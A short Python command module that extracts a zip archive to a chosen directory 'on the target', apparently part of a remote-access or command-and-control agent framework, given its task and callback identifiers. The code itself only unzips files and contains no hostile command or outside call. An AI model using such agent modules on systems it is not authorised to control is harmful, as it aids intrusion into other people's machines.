import os
import json
import zipfile


# Extracts a zip archive on the target to a specified destination directory
def execute(params, task_id, callback_id):
    try:
        parsed = json.loads(params)
        src  = parsed.get("src", "").strip()
        dest = parsed.get("dest", "").strip()
    except Exception:
        return "unzip: invalid parameters"

    if not src or not dest:
        return "unzip: src and dest are required"

    src = os.path.expanduser(src)

    if not os.path.exists(src):
        return f"unzip: {src}: no such file or directory"
    if not zipfile.is_zipfile(src):
        return f"unzip: {src}: not a valid zip file"

    try:
        os.makedirs(dest, exist_ok=True)
        with zipfile.ZipFile(src, "r") as zf:
            zf.extractall(dest)
        return f"extracted {src} -> {dest}"
    except PermissionError as e:
        return f"unzip: permission denied: {str(e)}"
    except Exception as e:
        return f"unzip error: {str(e)}"
